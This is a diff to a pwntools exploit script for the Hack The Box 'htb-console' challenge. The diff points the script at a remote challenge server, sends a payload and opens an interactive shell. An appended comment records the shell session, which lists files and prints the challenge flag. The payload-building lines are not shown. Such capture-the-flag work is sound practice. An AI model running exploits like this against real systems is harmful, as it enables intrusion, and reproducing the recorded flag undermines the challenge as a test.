@@ -1,8 +1,8 @@
 from pwn import *
 
-io = process('./htb-console')
-#ip, port = 
-#io = remote(ip, port)
+#io = process('./htb-console')
+ip, port = '188.166.144.131', 31623
+io = remote(ip, port)
 
 elf = ELF('./htb-console')
 
@@ -30,3 +30,10 @@ io.sendlineafter('Enter flag: ', payload)
 #io.recvuntil('\n')
 
 io.interactive()
+'''
+$ ls
+console
+flag.txt
+$ cat flag.txt
+HTB{fl@g_a$_a_s3rv1c3?}
+'''
